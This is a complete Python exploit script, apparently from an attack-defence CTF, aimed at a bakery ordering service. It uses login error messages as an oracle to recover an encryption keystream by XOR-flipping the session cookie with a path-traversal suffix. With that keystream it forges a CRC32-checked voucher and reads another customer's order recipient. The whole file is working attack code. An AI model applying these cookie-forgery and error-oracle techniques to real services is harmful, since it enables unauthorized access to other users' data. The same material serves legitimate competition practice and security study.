#!/usr/bin/env python3

from zlib import crc32
import string
import sys
import requests
import checklib
import base64
import random

MAX_USERNAME_LEN = 15
MAX_PASSWORD_LEN = 15

d = base64.urlsafe_b64decode
e = base64.urlsafe_b64encode

def register(host: str) -> str:
  username = checklib.rnd_string(MAX_USERNAME_LEN, alphabet=string.ascii_lowercase + string.digits)
  password = checklib.rnd_password(MAX_PASSWORD_LEN)

  s = checklib.get_initialized_session()
  r = s.post(f"http://{host}:41384/register", data={"username": username, "password": password})
  assert r.url == f"http://{host}:41384/"
  return username, s.cookies["session"]

def get_error(host, token, encrypted, eqn):
  # We try multiple numbers of '=' padding because sometimes the error isn't printed for some reason...
  session = e(encrypted).decode().strip('=')+eqn*'='+'./../'+token
  # The login endpoint is used here because it neatly prints an error on the page
  r = requests.get(f"http://{host}:41384/login", cookies={
    "session": session
  })

  needle = b'failed to auth: '
  assert r.status_code == 503
  assert needle in r.content

  start = r.content.index(needle)
  end = r.content.index(b'</p>', start+len(needle))
  error = r.content[start+len(needle):end]
  return error

def extract_recipient(host, token):
  r = requests.get(f"http://{host}:41385/order", params={"voucher": token})
  
  text = r.content.decode('utf-8')
  needle = ', Ваш свежеиспечённый хлеб'
  assert r.status_code == 200
  assert needle in text

  end = text.find(needle)
  start = text.rfind('<h3>', 0, end) + len('<h3>')
  return text[start:end]

def xorb(var, key):
    return bytes(a ^ b for a, b in zip(var, key))

def mutate(current, want, encrypted):
  return xorb(xorb(current, want), encrypted)

def extend(current, encrypted):
  # The newlines are needed because the errors are trimmed after a certain point,
  # by using a newline the error will be printed only after the newline... lol
  # {aaaa seems to break the JSON parser and nearly always give us output
  want = b'\n'*(len(current)-5)+b'{aaaa'
  return want, mutate(current, want, encrypted) + b'\x01'

def main():
  if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} host orderid")
    sys.exit(1)
  
  # Create user, get user's token
  host, order = sys.argv[1:3]
  username, token = register(host)

  # We will be forging this voucher later
  voucher = f"0000-01-01 00:00:00|{order}"
  voucher = f"{voucher}|{hex(crc32(voucher.encode()))[2:].zfill(8)}"

  # Originally this data is encrypted in the session part of the token
  current = f'{{"username":"{username}"}}'.encode()
  encrypted = d(token.split('.')[0] + '==')

  # Extend our current state until we reach the desired length
  while len(current) < len(voucher):
    current, encrypted = extend(current, encrypted)

    for i in range(0, 3):
      error = get_error(host, token, encrypted, i)
      if error.startswith(b'{aaaa') and len(error) > 5:
        break
    else:
      print(f"Unable to extend current={current} encrypted={encrypted}")
      sys.exit(1)

    newch = error[5:6]
    current = current + newch

  encrypted_voucher = mutate(current, voucher.encode(), encrypted)
  token = e(encrypted_voucher).decode().strip('=') + './../' + token
  print(f"Crafted voucher: {token}")
  print(extract_recipient(host, token))

if __name__ == '__main__':
  main()